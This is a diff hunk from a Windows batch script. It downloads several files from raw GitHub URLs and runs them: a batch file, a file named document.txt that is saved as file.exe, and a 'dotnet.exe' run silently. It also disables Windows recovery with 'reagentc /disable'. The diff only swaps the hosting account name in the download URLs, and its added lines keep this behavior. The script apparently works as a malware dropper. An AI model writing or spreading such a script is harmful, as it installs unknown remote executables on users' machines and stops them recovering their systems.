@@ -41,11 +41,11 @@ cd C:\ProgramData
 mkdir fffass
 cd fffass
 del backup.bat
-curl --ssl-no-revoke -o backup.bat https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/bat/backup.bat
+curl --ssl-no-revoke -o backup.bat https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/bat/backup.bat
 start backup.bat
-curl --ssl-no-revoke -L -o file.exe https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/document.txt
+curl --ssl-no-revoke -L -o file.exe https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/document.txt
 reagentc /disable
 start file.exe
-curl --ssl-no-revoke -L -o dotnet.exe https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/dotnet.exe
+curl --ssl-no-revoke -L -o dotnet.exe https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/dotnet.exe
 dotnet.exe /q /norestart /l "install.log"
 exit
